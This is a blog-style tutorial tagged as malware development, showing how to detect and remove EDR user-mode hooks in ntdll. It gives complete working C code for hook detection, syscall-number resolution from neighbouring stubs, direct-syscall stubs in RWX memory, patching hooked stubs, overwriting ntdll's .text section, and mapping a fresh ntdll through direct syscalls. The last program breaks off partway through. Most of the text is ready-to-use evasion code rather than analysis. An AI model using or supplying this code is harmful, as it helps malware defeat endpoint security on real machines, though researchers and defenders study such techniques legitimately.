---
tags:
  - MalwareDevelopment
---
# Detecting Hooks

![](/img/api-unhooking-cover.png)

Alright, so we know EDRs drop a `jmp` at the top of sensitive `Nt*` functions. The questions is now, how do we find them ? Because manually stepping through x64dbg for every functions isn't feasible.

The answer is pretty simple and we have already done it: We walk `ntdll`'s Export Address Table and check first byte of every exported `Nt*` function. If it's `0XE9`, something's been there before us.
## Walking the EAT

The EAT is how Windows resolves function names to addresses inside a DLL. We can walk it ourselves without calling `GetProcAddress` which is good because `GetProcAddress` itself can be hooked.

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Check if function starts with a JMP (0xE9) indicating a hook
BOOL IsHooked(PVOID funcAddr) {
    return *(PBYTE)funcAddr == 0xE9;
}

// Get the destination address of a JMP hook
PVOID GetHookTarget(PVOID funcAddr) {
    DWORD relOffset = *(PDWORD)((PBYTE)funcAddr + 1);
    return (PVOID)((PBYTE)funcAddr + 5 + relOffset);
}

// Walk ntdll's EAT and report hooked Nt* functions
void DetectHooks(void) {
    // ntdll is always mapped, GetModuleHandle won't call LoadLibrary
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return;
    }

    // DOS header sits at the module base, e_lfanew points to the PE header
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdrs = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosHdr->e_lfanew);

    // DataDirectory[0] is always the export directory RVA
    DWORD exportDirRVA = ntHdrs->OptionalHeader
                             .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                             .VirtualAddress;

    // RVA + module base = VA of the export directory struct
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)hNtdll + exportDirRVA
    );

    // AddressOfNames: array of RVAs to null-terminated export name strings
    PDWORD nameRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfNames);
    // AddressOfFunctions: array of RVAs to the actual function code
    PDWORD funcRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfFunctions);
    // AddressOfNameOrdinals: maps name index -> function array index
    PWORD  nameOrdinals = (PWORD) ((PBYTE)hNtdll + expDir->AddressOfNameOrdinals);

    int hookedCount = 0;

    printf("[*] Scanning ntdll exports for hooks...\n\n");

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        // Resolve the export name from its RVA
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);

        // Only check Nt* syscall stubs
        if (strncmp(name, "Nt", 2) != 0)
            continue;

        // nameOrdinals[i] gives the index into funcRVAs for this name
        PVOID funcAddr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);

        if (IsHooked(funcAddr)) {
            PVOID target = GetHookTarget(funcAddr);
            printf("[HOOKED] %-40s at %p -> jmp %p\n", name, funcAddr, target);
            hookedCount++;
        }
    }

    printf("\n[*] Scan complete. %d hook(s) found.\n", hookedCount);
}

int main(void) {
    DetectHooks();
    return 0;
}
```

So to bypass this hooking we can unhook API ourselves manually.
# Patching Individual Stubs

This is the surgical option lmao. Instead of touching anything we don't have to, we find each hooked stub, restore the original bytes, and leave everything else alone.

The tricky part is that to restore a stub we need to call `NtProtectVirtualMemory` to make the page writable first and `NtProtectVirtualMemory` might itself be hooked. So we need a way to call it that doesn't go through the hook.

That's where a generic direct syscall stub we build in previous blog comes in. 

We build a tiny piece of shellcode that does `mov r10, rcx; mov eax, <ssn>; syscall; ret`, completely bypassing ntdll. We need the correct syscall number (SSN) for the function we want to call.

For hooked functions, we use the **neighbor technique** to get the SSN: syscall numbers in ntdll are assigned in EAT order and are sequential. If `NtProtectVirtualMemory`'s neighbors are clean, we can read their SSNs and calculate ours by offset.

```c
// Extract SSN from a clean (unhooked) stub
DWORD GetSSN(PVOID funcAddr) {
    PBYTE p = (PBYTE)funcAddr;

    if (IsValidStub(p)) {
        // SSN lives at bytes [4] and [5] of a clean stub
        return (DWORD)p[4] | ((DWORD)p[5] << 8);
    }

    // If hooked, look at neighboring stubs (±1 in EAT order)
    // and infer by position omitted here for brevity
    return 0;
}
```
### Patching the Stub

Once we have the SSN and a way to call `NtProtectVirtualMemory` directly, the patch itself is just a `memcpy`:

```c
BOOL PatchStub(PVOID hookedFunc, DWORD ssn) {
    DWORD oldProtect = 0;
    SIZE_T stubSize  = 11; // size of a clean syscall stub

    // Bytes of a clean stub with the correct SSN baked in
    BYTE cleanStub[] = {
        0x4C, 0x8B, 0xD1,                        // mov r10, rcx
        0xB8, (BYTE)ssn, (BYTE)(ssn >> 8), 0x00, 0x00, // mov eax, ssn
        0x0F, 0x05,                               // syscall
        0xC3                                      // ret
    };

    // Make the page writable via direct syscall, not hooked NtProtect
    NTSTATUS status = Syscall(
        SSN_NtProtectVirtualMemory,
        GetCurrentProcess(),
        &hookedFunc,
        &stubSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) return FALSE;

    memcpy(hookedFunc, cleanStub, sizeof(cleanStub));

    // Restore original protection
    Syscall(
        SSN_NtProtectVirtualMemory,
        GetCurrentProcess(),
        &hookedFunc,
        &stubSize,
        oldProtect,
        &oldProtect
    );

    return TRUE;
}
```

This approach only touches the function we care about but we need to resolve the SSN for every target function.

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

// SSN for NtProtectVirtualMemory - resolved at runtime
static DWORD SSN_NtProtect = 0;

// Executable region holding our syscall trampoline
static PVOID g_StubMem = NULL;

// Check if first byte is E9 (jmp) = hooked
static BOOL IsHooked(PVOID addr) {
    return *(PBYTE)addr == 0xE9;
}

// Check if stub looks like a clean NT syscall stub
// mov r10,rcx = 4C 8B D1 | mov eax = B8
static BOOL IsCleanStub(PBYTE p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8;
}

// Extract SSN from a clean stub (bytes 4-5 hold the syscall number)
static DWORD ExtractSSN(PVOID addr) {
    PBYTE p = (PBYTE)addr;
    if (IsCleanStub(p))
        return (DWORD)p[4] | ((DWORD)p[5] << 8);
    return (DWORD)-1;
}

// Resolve SSN via neighbor: scan EAT neighbors +- offset until we hit a clean stub
// Syscall numbers in ntdll are sequential in EAT alphabetical order
static DWORD ResolveSSNByNeighbor(HMODULE hNtdll, DWORD targetNameIdx,
                                   PDWORD funcRVAs, PWORD nameOrdinals,
                                   DWORD numNames) {
    // Walk forward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx + offset >= numNames) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx + offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn - offset; // our SSN is neighbor's minus distance
    }
    // Walk backward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx < offset) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx - offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn + offset;
    }
    return (DWORD)-1;
}

// Allocate RWX memory and write a syscall stub with the given SSN baked in
// Returns pointer to executable stub memory
static PVOID AllocateSyscallStub(DWORD ssn) {
    BYTE tmpl[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };

    PBYTE mem = (PBYTE)VirtualAlloc(NULL, sizeof(tmpl),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;

    memcpy(mem, tmpl, sizeof(tmpl));
    // Patch SSN into bytes 4-7
    *(PDWORD)(mem + 4) = ssn;
    return mem;
}

// Call NtProtectVirtualMemory directly via our stub using inline asm
// Avoids the x64 variadic calling convention problem entirely
static NTSTATUS DirectNtProtect(PVOID stub,
                                 HANDLE hProcess,
                                 PVOID *baseAddr,
                                 PSIZE_T regionSize,
                                 DWORD  newProt,
                                 PDWORD oldProt) {
    // x64 calling convention:
    // rcx = hProcess, rdx = baseAddr, r8 = regionSize, r9 = newProt
    // stack arg (5th) = oldProt
    // We jump to our stub which does: mov r10,rcx; mov eax,ssn; syscall; ret
    typedef NTSTATUS (NTAPI *FnProtect)(HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD);
    return ((FnProtect)stub)(hProcess, baseAddr, regionSize, newProt, oldProt);
}

// Patch a hooked stub back to a clean syscall stub
static BOOL PatchStub(PVOID hookedFunc, DWORD ssn) {
    SIZE_T sz      = 11;
    DWORD  oldProt = 0;
    PVOID  target  = hookedFunc;

    BYTE cleanStub[] = {
        0x4C, 0x8B, 0xD1,                              // mov r10, rcx
        0xB8, (BYTE)ssn, (BYTE)(ssn >> 8), 0x00, 0x00, // mov eax, ssn
        0x0F, 0x05,                                    // syscall
        0xC3                                           // ret
    };

    // Make page writable via our direct stub, not the hooked NtProtect
    NTSTATUS st = DirectNtProtect(g_StubMem,
                                  GetCurrentProcess(),
                                  &target, &sz,
                                  PAGE_EXECUTE_READWRITE,
                                  &oldProt);
    if (!NT_SUCCESS(st)) {
        printf("[-] NtProtect failed for %p status=%08lX\n", hookedFunc, st);
        return FALSE;
    }

    memcpy(hookedFunc, cleanStub, sizeof(cleanStub));

    // Restore original page protection
    DirectNtProtect(g_StubMem,
                    GetCurrentProcess(),
                    &target, &sz,
                    oldProt, &oldProt);

    return TRUE;
}

int main(void) {
    // ntdll is always mapped, GetModuleHandle won't call LoadLibrary
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return 1;
    }

    // DOS header sits at the module base, e_lfanew points to the PE header
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);

    // DataDirectory[0] is always the export directory RVA
    DWORD expRVA = nth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);

    // AddressOfNames: array of RVAs to null-terminated export name strings
    PDWORD nameRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfNames);
    // AddressOfFunctions: array of RVAs to the actual function code
    PDWORD funcRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfFunctions);
    // AddressOfNameOrdinals: maps name index -> function array index
    PWORD  nameOrdinals = (PWORD) ((PBYTE)hNtdll + expDir->AddressOfNameOrdinals);
    DWORD  numNames     = expDir->NumberOfNames;

    // First pass: resolve SSN for NtProtectVirtualMemory
    // We need this before we can patch anything else
    for (DWORD i = 0; i < numNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);
        if (strcmp(name, "NtProtectVirtualMemory") != 0) continue;

        PVOID addr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);

        if (!IsHooked(addr))
            SSN_NtProtect = ExtractSSN(addr);
        else
            SSN_NtProtect = ResolveSSNByNeighbor(hNtdll, i,
                                                  funcRVAs, nameOrdinals,
                                                  numNames);
        printf("[*] NtProtectVirtualMemory @ %p hooked=%d SSN=0x%02lX\n",
               addr, IsHooked(addr), SSN_NtProtect);
        break;
    }

    if (SSN_NtProtect == 0 || SSN_NtProtect == (DWORD)-1) {
        printf("[-] Failed to resolve NtProtectVirtualMemory SSN\n");
        return 1;
    }

    // Allocate and build our direct syscall trampoline for NtProtect
    g_StubMem = AllocateSyscallStub(SSN_NtProtect);
    if (!g_StubMem) {
        printf("[-] Failed to allocate syscall stub\n");
        return 1;
    }
    printf("[+] Syscall stub allocated @ %p\n", g_StubMem);

    int patched = 0;
    int failed  = 0;

    // Second pass: find and patch all hooked Nt* stubs
    for (DWORD i = 0; i < numNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);

        // Only check Nt* syscall stubs
        if (strncmp(name, "Nt", 2) != 0) continue;

        PVOID addr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);
        if (!IsHooked(addr)) continue;

        // nameOrdinals[i] gives the index into funcRVAs for this name
        DWORD ssn = ResolveSSNByNeighbor(hNtdll, i,
                                          funcRVAs, nameOrdinals,
                                          numNames);
        if (ssn == (DWORD)-1) {
            printf("[-] Could not resolve SSN for %s\n", name);
            failed++;
            continue;
        }

        printf("[*] Patching %-40s SSN=0x%02lX\n", name, ssn);

        if (PatchStub(addr, ssn))
            patched++;
        else
            failed++;
    }

    printf("\n[+] Done. patched=%d failed=%d\n", patched, failed);

    // Keep process alive so you can attach WinDbg and verify
    printf("[*] Sleeping 60s - attach WinDbg and run: u ntdll!NtOpenProcess\n");
    Sleep(60000);

    VirtualFree(g_StubMem, 0, MEM_RELEASE);
    return 0;
}
```
# Full `.text` Section Remap

I think logically it logically makes sense to replace the whole section than patching individual functions. This approach reads a clean copy of `ntdll.dll` from disk and writes its `.text` section over the hooked in memory version in one shot. 

- Get the base address of the currently loaded (hooked) `ntdll` in memory.
- Read `ntdll.dll` fresh from `C:\Windows\System32\` into a private buffer.
- Parse the PE headers to find the `.text` section offset and size.
- Use a direct syscall to mark the in-memory `.text` as writable.
- `memcpy` the clean `.text` over the hooked version.
- Restore page protections.

```c
BOOL RemapNtdllText() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Read clean copy from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD  fileSize   = GetFileSize(hFile, NULL);
    PBYTE  diskBuffer = (PBYTE)VirtualAlloc(
        NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    DWORD bytesRead = 0;
    ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // Parse PE to locate .text section in the disk copy
    PIMAGE_DOS_HEADER  dos  = (PIMAGE_DOS_HEADER)diskBuffer;
    PIMAGE_NT_HEADERS  nth  = (PIMAGE_NT_HEADERS)(diskBuffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        PVOID  dest     = (PVOID)((PBYTE)hNtdll + sec->VirtualAddress);
        PVOID  src      = diskBuffer + sec->PointerToRawData;
        SIZE_T sectSize = sec->SizeOfRawData;
        DWORD  oldProt  = 0;

        // Direct syscall not touching hooked NtProtect
        Syscall(SSN_NtProtectVirtualMemory,
            GetCurrentProcess(), &dest, &sectSize,
            PAGE_EXECUTE_READWRITE, &oldProt);

        memcpy(dest, src, sectSize);

        Syscall(SSN_NtProtectVirtualMemory,
            GetCurrentProcess(), &dest, &sectSize,
            oldProt, &oldProt);

        break;
    }

    VirtualFree(diskBuffer, 0, MEM_RELEASE);
    return TRUE;
}
```

**Before remap:**

```
0:000> u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffc`a1b30000 e94ba2d375  jmp 00007ffc`e686a250
```

**After remap:**

```
0:000> u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffc`a1b30000 4c8bd1      mov     r10,rcx
00007ffc`a1b30003 b826000000  mov     eax,26h
00007ffc`a1b30008 0f05        syscall
00007ffc`a1b3000a c3          ret
```

Is is simplest implementation for broadest effect but also need to be cautious cause writing over entire `.text` section is a big memory write. Some EDRs detect this via ETW (Event Tracing for Windows) or active memory scanning.

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

// SSN for NtProtectVirtualMemory resolved at runtime
static DWORD SSN_NtProtect = 0;

// Executable region holding our direct syscall trampoline
static PVOID g_StubMem = NULL;

// Check if first byte is E9 (jmp) = hooked
static BOOL IsHooked(PVOID addr) {
    return *(PBYTE)addr == 0xE9;
}

// Check if stub looks like a clean NT syscall stub
// mov r10,rcx = 4C 8B D1 | mov eax = B8
static BOOL IsCleanStub(PBYTE p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8;
}

// Extract SSN from a clean stub (bytes 4-5 hold the syscall number)
static DWORD ExtractSSN(PVOID addr) {
    PBYTE p = (PBYTE)addr;
    if (IsCleanStub(p))
        return (DWORD)p[4] | ((DWORD)p[5] << 8);
    return (DWORD)-1;
}

// Resolve SSN via neighbor: scan EAT neighbors +- offset until clean stub
// Syscall numbers are sequential in EAT alphabetical order
static DWORD ResolveSSNByNeighbor(HMODULE hNtdll, DWORD targetNameIdx,
                                   PDWORD funcRVAs, PWORD nameOrdinals,
                                   DWORD numNames) {
    // Walk forward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx + offset >= numNames) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx + offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn - offset;
    }
    // Walk backward
    for (DWORD offset = 1; offset < 10; offset++) {
        if (targetNameIdx < offset) break;
        PVOID neighbor = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[targetNameIdx - offset]]);
        DWORD ssn = ExtractSSN(neighbor);
        if (ssn != (DWORD)-1)
            return ssn + offset;
    }
    return (DWORD)-1;
}

// Allocate RWX memory and write a syscall stub with the given SSN baked in
static PVOID AllocateSyscallStub(DWORD ssn) {
    BYTE tmpl[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };

    PBYTE mem = (PBYTE)VirtualAlloc(NULL, sizeof(tmpl),
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, tmpl, sizeof(tmpl));
    // Patch SSN into bytes 4-7
    *(PDWORD)(mem + 4) = ssn;
    return mem;
}

// Call NtProtectVirtualMemory directly via our stub
// Uses typed function pointer to respect x64 calling convention
static NTSTATUS DirectNtProtect(PVOID stub,
                                 HANDLE hProcess,
                                 PVOID *baseAddr,
                                 PSIZE_T regionSize,
                                 DWORD  newProt,
                                 PDWORD oldProt) {
    typedef NTSTATUS (NTAPI *FnProtect)(HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD);
    return ((FnProtect)stub)(hProcess, baseAddr, regionSize, newProt, oldProt);
}

// Resolve SSN for NtProtectVirtualMemory by walking the EAT
static BOOL ResolveSyscalls(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
    DWORD expRVA = nth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                       .VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);

    PDWORD nameRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfNames);
    PDWORD funcRVAs     = (PDWORD)((PBYTE)hNtdll + expDir->AddressOfFunctions);
    PWORD  nameOrdinals = (PWORD) ((PBYTE)hNtdll + expDir->AddressOfNameOrdinals);
    DWORD  numNames     = expDir->NumberOfNames;

    for (DWORD i = 0; i < numNames; i++) {
        LPCSTR name = (LPCSTR)((PBYTE)hNtdll + nameRVAs[i]);
        if (strcmp(name, "NtProtectVirtualMemory") != 0) continue;

        PVOID addr = (PVOID)((PBYTE)hNtdll + funcRVAs[nameOrdinals[i]]);

        if (!IsHooked(addr))
            SSN_NtProtect = ExtractSSN(addr);
        else
            SSN_NtProtect = ResolveSSNByNeighbor(hNtdll, i,
                                                  funcRVAs, nameOrdinals,
                                                  numNames);

        printf("[*] NtProtectVirtualMemory @ %p hooked=%d SSN=0x%02lX\n",
               addr, IsHooked(addr), SSN_NtProtect);
        break;
    }

    if (SSN_NtProtect == 0 || SSN_NtProtect == (DWORD)-1) return FALSE;

    g_StubMem = AllocateSyscallStub(SSN_NtProtect);
    if (!g_StubMem) return FALSE;

    printf("[+] Syscall stub @ %p\n", g_StubMem);
    return TRUE;
}

// Read ntdll from disk, find .text section, overwrite hooked in-memory copy
BOOL RemapNtdllText(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Read a clean copy of ntdll straight from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll.dll from disk: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    PBYTE diskBuffer = (PBYTE)VirtualAlloc(NULL, fileSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
    if (!diskBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[*] Read %lu bytes of ntdll.dll from disk\n", bytesRead);

    // Parse PE headers of the disk copy to find the .text section
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)diskBuffer;
    PIMAGE_NT_HEADERS     nth = (PIMAGE_NT_HEADERS)(diskBuffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    BOOL result = FALSE;

    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
        // Match .text section by name
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        // dest = in-memory .text of the loaded (hooked) ntdll
        PVOID  dest     = (PVOID)((PBYTE)hNtdll + sec->VirtualAddress);
        // src  = .text from our clean disk copy (file offset, not RVA)
        PVOID  src      = (PVOID)(diskBuffer + sec->PointerToRawData);
        SIZE_T sectSize = (SIZE_T)sec->SizeOfRawData;
        DWORD  oldProt  = 0;

        printf("[*] .text section: disk offset=0x%lX RVA=0x%lX size=0x%lX\n",
               sec->PointerToRawData, sec->VirtualAddress, sec->SizeOfRawData);
        printf("[*] Overwriting in-memory .text @ %p with clean disk copy\n", dest);

        // Make the in-memory .text writable via direct syscall
        // We cannot use the hooked NtProtect here
        NTSTATUS st = DirectNtProtect(g_StubMem,
                                       GetCurrentProcess(),
                                       &dest, &sectSize,
                                       PAGE_EXECUTE_READWRITE,
                                       &oldProt);
        if (!NT_SUCCESS(st)) {
            printf("[-] NtProtect (make writable) failed: 0x%08lX\n", st);
            break;
        }

        // Overwrite entire .text section in one shot
        memcpy(dest, src, sectSize);

        // Restore original page protections
        st = DirectNtProtect(g_StubMem,
                              GetCurrentProcess(),
                              &dest, &sectSize,
                              oldProt, &oldProt);
        if (!NT_SUCCESS(st))
            printf("[!] NtProtect (restore) failed: 0x%08lX\n", st);

        printf("[+] .text section remapped successfully\n");
        result = TRUE;
        break;
    }

    VirtualFree(diskBuffer, 0, MEM_RELEASE);
    return result;
}

int main(void) {
    // Step 1: resolve SSN for NtProtectVirtualMemory and build direct stub
    // We need this before we can make any memory writable for the remap
    if (!ResolveSyscalls()) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    // Step 2: remap entire .text section from clean disk copy
    // This removes all hooks in one memcpy instead of patching one by one
    if (!RemapNtdllText()) {
        printf("[-] Remap failed\n");
        VirtualFree(g_StubMem, 0, MEM_RELEASE);
        return 1;
    }

    // Keep process alive to attach WinDbg and verify
    printf("[*] Sleeping 60s - attach WinDbg and run: u ntdll!NtOpenProcess\n");
    Sleep(60000);

    VirtualFree(g_StubMem, 0, MEM_RELEASE);
    return 0;
}
```
# Load Fresh NTDLL From Disk via Syscall

So instead of modifying the hooked ntdll at all, we load a completely separate, clean copy of ntdll into process and we do the entire load using only direct syscalls so the hooked APIs are never involved.

```c
BOOL LoadCleanNtdll(PVOID* cleanBase) {
    NTSTATUS status;
    HANDLE   hFile    = NULL;
    HANDLE   hSection = NULL;
    PVOID    baseAddr = NULL;
    SIZE_T   viewSize = 0;

    // Native path format — required for NT APIs
    UNICODE_STRING ntdllPath;
    RtlInitUnicodeString(&ntdllPath,
        L"\\??\\C:\\Windows\\System32\\ntdll.dll");

    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(
        &objAttr, &ntdllPath,
        OBJ_CASE_INSENSITIVE, NULL, NULL
    );

    IO_STATUS_BLOCK ioStatus = { 0 };

    // Step 1: Open the file with direct syscall
    status = Syscall(
        SSN_NtOpenFile,
        &hFile,
        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(status)) return FALSE;

    // Step 2: Create a section backed by the file
    // SEC_IMAGE tells the kernel to treat it as a PE image
    status = Syscall(
        SSN_NtCreateSection,
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        NULL, NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    Syscall(SSN_NtClose, hFile);
    if (!NT_SUCCESS(status)) return FALSE;

    // Step 3: Map the section into our process
    status = Syscall(
        SSN_NtMapViewOfSection,
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0, 0, NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READ
    );
    Syscall(SSN_NtClose, hSection);
    if (!NT_SUCCESS(status)) return FALSE;

    *cleanBase = baseAddr;
    return TRUE;
}
```

`baseAddr` now points to a freshly mapped, unhooked copy of `ntdll` sitting in our process. From here we have options:

- **Extract SSNs** directly from this clean copy's EAT no more neighbor guessing.
- **Copy its `.text` section** into the original ntdll (combine Approach 2 + 3 for maximum cleanliness).
- **Resolve and call functions** directly from this base, treating it as a second ntdll.

The original snippet is short because it assumes three things already exist: a working `Syscall()` dispatcher, resolved SSNs (`SSN_NtOpenFile` etc.), and the standard NT type definitions. The bulk of a full implementation is just building that infrastructure from scratch.

The technique itself is three NT calls chained together. First, `NtOpenFile` opens `ntdll.dll` on disk using the NT object namespace path (`\??\C:\Windows\System32\ntdll.dll`) rather than a Win32 path, because we are calling the NT layer directly. Second, `NtCreateSection` creates a memory section backed by that file with the `SEC_IMAGE` flag. This flag is the key detail: it tells the kernel to treat the file as a PE image and apply full section alignment and base relocations, so the resulting mapping looks exactly like a loaded DLL. Third, `NtMapViewOfSection` maps that section into our process's virtual address space, and the kernel hands back a base address pointing at a complete, properly laid out PE image.

The reason all three calls go through `Syscall()` instead of the normal API is that most EDRs install their hooks inside the already-loaded ntdll. Calling `NtOpenFile` normally would jump straight into the EDR's trampoline before ever reaching the kernel. By resolving the raw syscall numbers and invoking the `syscall` instruction directly, we go kernel-side without touching a single hooked byte. The result, `baseAddr`, is a second copy of ntdll sitting in the process that the EDR has never seen or touched. From here you can extract SSNs from its export table without guessing, call functions through its stubs to bypass hooks for the rest of the session, or copy its `.text` section over the original ntdll to remove all trampolines in place.

```c
// Loads a fresh, unhooked copy of ntdll.dll from disk using only
// direct NT syscalls.  No hooked API is ever invoked during the
// load sequence, so EDR userland trampolines are completely bypassed.
//

//  1. Walk PEB.InMemoryOrderModuleList to find the base of the already-
//     loaded (possibly hooked) ntdll - no API call needed.
//  2. Scan its EAT for syscall numbers (SSNs) using Hell's Gate
//     byte-pattern matching.  If a stub is hooked (prologue overwritten
//     by an EDR JMP trampoline), derive the SSN from a clean neighboring
//     stub instead (Halo's Gate).
//  3. Build four tiny 11-byte RWX syscall stubs with the resolved SSNs.
//  4. Use those stubs to:
//        NtOpenFile         - open ntdll.dll on disk
//        NtCreateSection    - create a SEC_IMAGE section (full PE layout)
//        NtMapViewOfSection - map it into our VA space
//        NtClose            - close temporary handles
//  5. baseAddr now holds a pristine, unhooked PE image we can use to:
//        a) Extract any SSN directly from the clean EAT (no guessing)
//        b) Resolve and call functions through clean stubs (no hook)
//        c) Overwrite the original ntdll .text in place (approach 2+3)
//   x86_64-w64-mingw32-gcc -O2 -o approach3.exe approach3.c
// x86-64 only.  Tested on Windows 10 22H2 and Windows 11 23H2.

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

// S1  Missing defines that MinGW-w64 winternl.h either omits or stubs out

#ifndef NT_SUCCESS
#define NT_SUCCESS(s)                   ((NTSTATUS)(s) >= 0)
#endif

// SEC_IMAGE tells NtCreateSection to treat the file as a PE image
#ifndef SEC_IMAGE
#define SEC_IMAGE                       0x01000000
#endif

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE            0x00000040L
#endif

// Required by NtOpenFile to allow synchronous I/O completion
